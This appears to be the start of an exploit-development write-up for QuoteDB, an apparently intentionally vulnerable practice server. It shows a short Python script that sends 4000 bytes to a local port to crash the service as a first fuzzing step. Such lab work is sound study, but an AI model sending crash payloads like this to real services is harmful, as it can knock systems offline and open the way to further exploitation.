#  QuoteDB

Downloaded from: https://github.com/bmdyy/quote_db/

## Initial Crash

```py
import struct
import socket


TARGET_IP = "127.0.0.1"
TARGET_PORT = 3700
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 4000  # change me

payload = b"1"*CRASH_LEN

with socket.create_connection(target) as sock:
    sent = sock.send(payload)
    resp = sock.recv(512)
    print(resp)
sock.close()
```
